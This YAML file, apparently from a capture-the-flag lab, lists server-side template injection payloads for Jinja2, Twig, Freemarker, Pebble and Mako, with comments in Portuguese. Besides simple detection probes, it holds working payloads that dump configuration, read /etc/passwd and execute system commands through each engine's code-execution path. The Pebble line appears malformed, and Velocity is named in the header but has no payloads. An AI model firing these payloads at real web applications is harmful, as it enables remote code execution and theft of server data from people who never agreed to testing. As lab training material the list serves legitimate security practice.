# SSTI payloads — CTFLab v5.6
# Testam Jinja2, Twig, Freemarker, Pebble, Velocity, Mako
payloads:
  # ── detecção genérica (expressão matemática que avalia) ──────────────
  - "{{7*7}}"
  - "${7*7}"
  - "#{7*7}"
  - "*{7*7}"
  - "[[7*7]]"
  - "{{7*'7'}}"        # Distingue Jinja2 (49) de Twig (7777777)
  # ── Jinja2 / Python ──────────────────────────────────────────────────
  - "{{config}}"
  - "{{config.items()}}"
  - "{{request.environ}}"
  - "{{''.__class__.__mro__[1].__subclasses__()}}"
  - "{{''.__class__.__base__.__subclasses__()}}"
  - "{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}"
  - "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
  # ── Twig / PHP ────────────────────────────────────────────────────────
  - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
  - "{{app.request.server.all|join(',')}}"
  # ── Freemarker / Java ─────────────────────────────────────────────────
  - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
  # ── Pebble / Java ─────────────────────────────────────────────────────
  - "{{'' + (''class.forName('java.lang.Runtime')).getMethod('exec',''.class).invoke(''class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}"
  # ── Mako / Python ────────────────────────────────────────────────────
  - "${__import__('os').popen('id').read()}"
